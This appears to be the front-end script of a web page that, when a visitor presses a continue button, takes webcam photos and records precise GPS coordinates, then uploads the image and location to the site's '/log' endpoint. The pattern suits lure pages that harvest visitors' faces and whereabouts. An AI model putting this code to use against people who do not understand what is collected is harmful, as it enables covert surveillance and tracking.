// public/script.js
let watchId = null;
let lastPosition = null;
const ACCURACY_THRESHOLD = 30; // meters
const DISTANCE_THRESHOLD = 5; // meters movement threshold

function status(message) {
  document.getElementById('status').innerText = message;
}

function init() {
  const btn = document.getElementById('continueButton');
  btn.addEventListener('click', async () => {
    // Always trigger camera first, even if geolocation fails or is denied
    status('Capturing photo…');
    await capturePhoto(null);
    // Then start high‑accuracy tracking
    startTracking();
  });
}

function startTracking() {
  const btn = document.getElementById('continueButton');
  btn.disabled = true;

  if (!navigator.geolocation) {
    status('Geolocation not supported.');
    btn.disabled = false;
    return;
  }

  status('Initializing GPS…');
  watchId = navigator.geolocation.watchPosition(
    handlePosition,
    handleError,
    { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
  );

  // Fallback if no high‑accuracy fix in 30s
  setTimeout(() => {
    if (watchId !== null) {
      navigator.geolocation.clearWatch(watchId);
      status('Fallback: using best available location.');
      handlePosition(lastPosition);
    }
  }, 31000);
}

function handlePosition(position) {
  if (!position || !position.coords) return;
  const { latitude, longitude, accuracy } = position.coords;
  lastPosition = position;

  status(`GPS accuracy: ±${accuracy.toFixed(1)} m`);
  if (accuracy > ACCURACY_THRESHOLD) {
    // wait for better accuracy
    return;
  }

  // Check movement
  if (lastPosition && lastPosition.coords) {
    const dx = latitude - lastPosition.coords.latitude;
    const dy = longitude - lastPosition.coords.longitude;
    const dist = Math.sqrt(dx*dx + dy*dy) * 111000;
    if (dist < DISTANCE_THRESHOLD) {
      status(`Stable location (±${accuracy.toFixed(1)} m).`);
    }
  }

  // Got precise fix, stop watching
  if (watchId !== null) {
    navigator.geolocation.clearWatch(watchId);
    watchId = null;
  }

  // Capture photo with geo data
  capturePhoto({ latitude, longitude, accuracy });
}

function handleError(error) {
  const btn = document.getElementById('continueButton');
  let msg;
  switch (error.code) {
    case error.PERMISSION_DENIED:
      msg = 'Location permission denied.';
      break;
    case error.POSITION_UNAVAILABLE:
      msg = 'Location unavailable.';
      break;
    case error.TIMEOUT:
      msg = 'Location request timed out.';
      break;
    default:
      msg = 'Unknown geolocation error.';
  }
  status(msg);
  btn.disabled = false;
}

async function capturePhoto(geo) {
  status('Preparing camera…');
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();

    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    stream.getTracks().forEach(track => track.stop());

    const dataURL = canvas.toDataURL('image/png');
    const preview = document.getElementById('preview');
    preview.src = dataURL;
    preview.style.display = 'block';

    // Create download link
    let link = document.getElementById('downloadLink');
    if (!link) {
      link = document.createElement('a');
      link.id = 'downloadLink';
      link.innerText = 'Download Image';
      link.style.display = 'block';
      link.style.marginTop = '10px';
      document.getElementById('container').appendChild(link);
    }
    link.href = dataURL;
    link.download = `snapshot_${Date.now()}.png`;

    // Send to backend if geo provided
    if (geo) {
      const payload = { ...geo, photo: dataURL, timestamp: new Date().toISOString() };
      status('Uploading data…');
      await fetch('/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      status('Data logged successfully ✔️');
    }
  } catch (err) {
    status('Camera error: ' + err.message);
  } finally {
    document.getElementById('continueButton').disabled = false;
  }
}

document.addEventListener('DOMContentLoaded', init);
